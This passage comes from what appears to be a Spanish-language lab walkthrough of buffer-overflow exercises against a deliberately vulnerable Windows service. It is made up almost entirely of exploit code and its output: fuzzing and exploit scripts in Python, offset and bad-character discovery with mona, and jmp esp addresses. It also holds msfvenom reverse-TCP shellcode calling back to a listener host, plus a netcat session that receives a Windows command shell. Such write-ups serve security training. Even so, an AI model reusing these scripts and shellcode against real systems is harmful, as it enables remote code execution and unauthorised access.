\u0026#34;\\x9c\\x8f\\xfe\\x4b\\xa1\\xc5\\x88\\xb3\\x10\\xb0\\xcc\\xcc\\x9d\\x54\\xd9\u0026#34; \u0026#34;\\xb5\\xc3\\xc4\\x26\\x6c\\x40\\xe4\\xc4\\xa4\\xbd\\x8d\\x50\\x2d\\x7c\\xd0\u0026#34; \u0026#34;\\x62\\x98\\x43\\xed\\xe0\\x28\\x3c\\x0a\\xf8\\x59\\x39\\x56\\xbe\\xb2\\x33\u0026#34; \u0026#34;\\xc7\\x2b\\xb4\\xe0\\xe8\\x79\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (2020).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 shellcode = (\u0026#34;\\xbf\\xad\\xc1\\x09\\x76\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5b\\x33\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x7b\\x12\\x83\\xeb\\xfc\\x03\\xd6\\xcf\\xeb\\x83\\xd4\\x38\\x69\u0026#34; \u0026#34;\\x6b\\x24\\xb9\\x0e\\xe5\\xc1\\x88\\x0e\\x91\\x82\\xbb\\xbe\\xd1\\xc6\\x37\u0026#34; \u0026#34;\\x34\\xb7\\xf2\\xcc\\x38\\x10\\xf5\\x65\\xf6\\x46\\x38\\x75\\xab\\xbb\\x5b\u0026#34; \u0026#34;\\xf5\\xb6\\xef\\xbb\\xc4\\x78\\xe2\\xba\\x01\\x64\\x0f\\xee\\xda\\xe2\\xa2\u0026#34; \u0026#34;\\x1e\\x6e\\xbe\\x7e\\x95\\x3c\\x2e\\x07\\x4a\\xf4\\x51\\x26\\xdd\\x8e\\x0b\u0026#34; \u0026#34;\\xe8\\xdc\\x43\\x20\\xa1\\xc6\\x80\\x0d\\x7b\\x7d\\x72\\xf9\\x7a\\x57\\x4a\u0026#34; \u0026#34;\\x02\\xd0\\x96\\x62\\xf1\\x28\\xdf\\x45\\xea\\x5e\\x29\\xb6\\x97\\x58\\xee\u0026#34; \u0026#34;\\xc4\\x43\\xec\\xf4\\x6f\\x07\\x56\\xd0\\x8e\\xc4\\x01\\x93\\x9d\\xa1\\x46\u0026#34; \u0026#34;\\xfb\\x81\\x34\\x8a\\x70\\xbd\\xbd\\x2d\\x56\\x37\\x85\\x09\\x72\\x13\\x5d\u0026#34; \u0026#34;\\x33\\x23\\xf9\\x30\\x4c\\x33\\xa2\\xed\\xe8\\x38\\x4f\\xf9\\x80\\x63\\x18\u0026#34; \u0026#34;\\xce\\xa8\\x9b\\xd8\\x58\\xba\\xe8\\xea\\xc7\\x10\\x66\\x47\\x8f\\xbe\\x71\u0026#34; \u0026#34;\\xa8\\xba\\x07\\xed\\x57\\x45\\x78\\x24\\x9c\\x11\\x28\\x5e\\x35\\x1a\\xa3\u0026#34; \u0026#34;\\x9e\\xba\\xcf\\x64\\xce\\x14\\xa0\\xc4\\xbe\\xd4\\x10\\xad\\xd4\\xda\\x4f\u0026#34; \u0026#34;\\xcd\\xd7\\x30\\xf8\\x64\\x22\\xd3\\xc7\\xd1\\x3a\\x22\\xa0\\x23\\x42\\x21\u0026#34; \u0026#34;\\x0a\\xad\\xa4\\x43\\x7a\\xfb\\x7f\\xfc\\xe3\\xa6\\x0b\\x9d\\xec\\x7c\\x76\u0026#34; \u0026#34;\\x9d\\x67\\x73\\x87\\x50\\x80\\xfe\\x9b\\x05\\x60\\xb5\\xc1\\x80\\x7f\\x63\u0026#34; \u0026#34;\\x6d\\x4e\\xed\\xe8\\x6d\\x19\\x0e\\xa7\\x3a\\x4e\\xe0\\xbe\\xae\\x62\\x5b\u0026#34; \u0026#34;\\x69\\xcc\\x7e\\x3d\\x52\\x54\\xa5\\xfe\\x5d\\x55\\x28\\xba\\x79\\x45\\xf4\u0026#34; \u0026#34;\\x43\\xc6\\x31\\xa8\\x15\\x90\\xef\\x0e\\xcc\\x52\\x59\\xd9\\xa3\\x3c\\x0d\u0026#34; \u0026#34;\\x9c\\x8f\\xfe\\x4b\\xa1\\xc5\\x88\\xb3\\x10\\xb0\\xcc\\xcc\\x9d\\x54\\xd9\u0026#34; \u0026#34;\\xb5\\xc3\\xc4\\x26\\x6c\\x40\\xe4\\xc4\\xa4\\xbd\\x8d\\x50\\x2d\\x7c\\xd0\u0026#34; \u0026#34;\\x62\\x98\\x43\\xed\\xe0\\x28\\x3c\\x0a\\xf8\\x59\\x39\\x56\\xbe\\xb2\\x33\u0026#34; \u0026#34;\\xc7\\x2b\\xb4\\xe0\\xe8\\x79\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011d3) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1514 + eip_ret + nops + shellcode + padding * (2020 - 1514 - 4 - 16 - 351) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_9 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49172 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 10 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW10.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 700 bytes.\n1 2 3 4 ➜ OVERFLOW_10 ./overflow10.py 192.168.22.128 [▝] Progreso: Enviando 700 bytes. [-] Parece que el programa se detuvo con 700 bytes. ➜ OVERFLOW_10 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 1000 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 537 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 1000 [+] Command used: !mona findmsp -distance 1000 [..] [+] Examining registers EIP contains normal pattern : 0x41397241 (offset 537) ESP (0x0182fa30) points at offset 541 in normal pattern (length 459) EBP contains normal pattern : 0x38724137 (offset 533) EBX contains normal pattern : 0x72413672 (offset 529) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1000).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 537 + eip_ret + nops + padding * (1000-537-4) # junk 537, eip 4, padding 459 = 1000 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 50 bytes adicionales, en total tendríamos 509 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 537 + eip_ret + nops + padding * (1000 - 537 - 4 + 50) # 509 padding # 537 junk, 4 eip_ret, padding 509 (shellcode + nops) # total buffer = 1050 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 1050 bytes de los cuales 509 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 537 + eip_ret + nops + badchars + padding * (1050 - 537 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\xa0\\xad\\xbe\\xde\\xef\u0026quot;.\n1 \\x00\\xa0\\xad\\xbe\\xde\\xef JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\xa0\\xad\\xbe\\xde\\xef\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\xa0\\xad\\xbe\\xde\\xef\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\xa0\\xad\\xbe\\xde\\xef\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501205) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\xa0\\xad\\xbe\\xde\\xef\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor succeeded with size 348 (iteration=0) x86/call4_dword_xor chosen with final size 348 Payload size: 348 bytes Final size of c file: 1488 bytes unsigned char buf[] = \u0026#34;\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026#34; \u0026#34;\\xdd\\xa6\\xc1\\xce\\x83\\xee\\xfc\\xe2\\xf4\\x21\\x4e\\x43\\xce\\xdd\\xa6\u0026#34; \u0026#34;\\xa1\\x47\\x38\\x97\\x01\\xaa\\x56\\xf6\\xf1\\x45\\x8f\\xaa\\x4a\\x9c\\xc9\u0026#34; \u0026#34;\\x2d\\xb3\\xe6\\xd2\\x11\\x8b\\xe8\\xec\\x59\\x6d\\xf2\\xbc\\xda\\xc3\\xe2\u0026#34; \u0026#34;\\xfd\\x67\\x0e\\xc3\\xdc\\x61\\x23\\x3c\\x8f\\xf1\\x4a\\x9c\\xcd\\x2d\\x8b\u0026#34; \u0026#34;\\xf2\\x56\\xea\\xd0\\xb6\\x3e\\xee\\xc0\\x1f\\x8c\\x2d\\x98\\xee\\xdc\\x75\u0026#34; \u0026#34;\\x4a\\x87\\xc5\\x45\\xfb\\x87\\x56\\x92\\x4a\\xcf\\x0b\\x97\\x3e\\x62\\x1c\u0026#34; \u0026#34;\\x69\\xcc\\xcf\\x1a\\x9e\\x21\\xbb\\x2b\\xa5\\xbc\\x36\\xe6\\xdb\\xe5\\xbb\u0026#34; \u0026#34;\\x39\\xfe\\x4a\\x96\\xf9\\xa7\\x12\\xa8\\x56\\xaa\\x8a\\x45\\x85\\xba\\xc0\u0026#34; \u0026#34;\\x1d\\x56\\xa2\\x4a\\xcf\\x0d\\x2f\\x85\\xea\\xf9\\xfd\\x9a\\xaf\\x84\\xfc\u0026#34; \u0026#34;\\x90\\x31\\x3d\\xf9\\x9e\\x94\\x56\\xb4\\x2a\\x43\\x80\\xce\\xf2\\xfc\\xdd\u0026#34; \u0026#34;\\xa6\\xa9\\xb9\\xae\\x94\\x9e\\x9a\\xb5\\xea\\xb6\\xe8\\xda\\x59\\x14\\x76\u0026#34; \u0026#34;\\x4d\\xa7\\xc1\\xce\\xf4\\x62\\x95\\x9e\\xb5\\x8f\\x41\\xa5\\xdd\\x59\\x14\u0026#34; \u0026#34;\\x9e\\x8d\\xf6\\x91\\x8e\\x8d\\xe6\\x91\\xa6\\x37\\xa9\\x1e\\x2e\\x22\\x73\u0026#34; \u0026#34;\\x56\\xa4\\xd8\\xce\\x01\\x66\\xcb\\xa7\\xa9\\xcc\\xdd\\xa3\\xfb\\x47\\x3b\u0026#34; \u0026#34;\\xcc\\xd1\\x98\\x8a\\xce\\x58\\x6b\\xa9\\xc7\\x3e\\x1b\\x58\\x66\\xb5\\xc2\u0026#34; \u0026#34;\\x22\\xe8\\xc9\\xbb\\x31\\xce\\x31\\x7b\\x7f\\xf0\\x3e\\x1b\\xb5\\xc5\\xac\u0026#34; \u0026#34;\\xaa\\xdd\\x2f\\x22\\x99\\x8a\\xf1\\xf0\\x38\\xb7\\xb4\\x98\\x98\\x3f\\x5b\u0026#34; \u0026#34;\\xa7\\x09\\x99\\x82\\xfd\\xcf\\xdc\\x2b\\x85\\xea\\xcd\\x60\\xc1\\x8a\\x89\u0026#34; \u0026#34;\\xf6\\x97\\x98\\x8b\\xe0\\x97\\x80\\x8b\\xf0\\x92\\x98\\xb5\\xdf\\x0d\\xf1\u0026#34; \u0026#34;\\x5b\\x59\\x14\\x47\\x3d\\xe8\\x97\\x88\\x22\\x96\\xa9\\xc6\\x5a\\xbb\\xa1\u0026#34; \u0026#34;\\x31\\x08\\x1d\\x21\\xd3\\xf7\\xac\\xa9\\x68\\x48\\x1b\\x5c\\x31\\x08\\x9a\u0026#34; \u0026#34;\\xc7\\xb2\\xd7\\x26\\x3a\\x2e\\xa8\\xa3\\x7a\\x89\\xce\\xd4\\xae\\xa4\\xdd\u0026#34; \u0026#34;\\xf5\\x3e\\x1b\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (1050).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026#34; \u0026#34;\\xdd\\xa6\\xc1\\xce\\x83\\xee\\xfc\\xe2\\xf4\\x21\\x4e\\x43\\xce\\xdd\\xa6\u0026#34; \u0026#34;\\xa1\\x47\\x38\\x97\\x01\\xaa\\x56\\xf6\\xf1\\x45\\x8f\\xaa\\x4a\\x9c\\xc9\u0026#34; \u0026#34;\\x2d\\xb3\\xe6\\xd2\\x11\\x8b\\xe8\\xec\\x59\\x6d\\xf2\\xbc\\xda\\xc3\\xe2\u0026#34; \u0026#34;\\xfd\\x67\\x0e\\xc3\\xdc\\x61\\x23\\x3c\\x8f\\xf1\\x4a\\x9c\\xcd\\x2d\\x8b\u0026#34; \u0026#34;\\xf2\\x56\\xea\\xd0\\xb6\\x3e\\xee\\xc0\\x1f\\x8c\\x2d\\x98\\xee\\xdc\\x75\u0026#34; \u0026#34;\\x4a\\x87\\xc5\\x45\\xfb\\x87\\x56\\x92\\x4a\\xcf\\x0b\\x97\\x3e\\x62\\x1c\u0026#34; \u0026#34;\\x69\\xcc\\xcf\\x1a\\x9e\\x21\\xbb\\x2b\\xa5\\xbc\\x36\\xe6\\xdb\\xe5\\xbb\u0026#34; \u0026#34;\\x39\\xfe\\x4a\\x96\\xf9\\xa7\\x12\\xa8\\x56\\xaa\\x8a\\x45\\x85\\xba\\xc0\u0026#34; \u0026#34;\\x1d\\x56\\xa2\\x4a\\xcf\\x0d\\x2f\\x85\\xea\\xf9\\xfd\\x9a\\xaf\\x84\\xfc\u0026#34; \u0026#34;\\x90\\x31\\x3d\\xf9\\x9e\\x94\\x56\\xb4\\x2a\\x43\\x80\\xce\\xf2\\xfc\\xdd\u0026#34; \u0026#34;\\xa6\\xa9\\xb9\\xae\\x94\\x9e\\x9a\\xb5\\xea\\xb6\\xe8\\xda\\x59\\x14\\x76\u0026#34; \u0026#34;\\x4d\\xa7\\xc1\\xce\\xf4\\x62\\x95\\x9e\\xb5\\x8f\\x41\\xa5\\xdd\\x59\\x14\u0026#34; \u0026#34;\\x9e\\x8d\\xf6\\x91\\x8e\\x8d\\xe6\\x91\\xa6\\x37\\xa9\\x1e\\x2e\\x22\\x73\u0026#34; 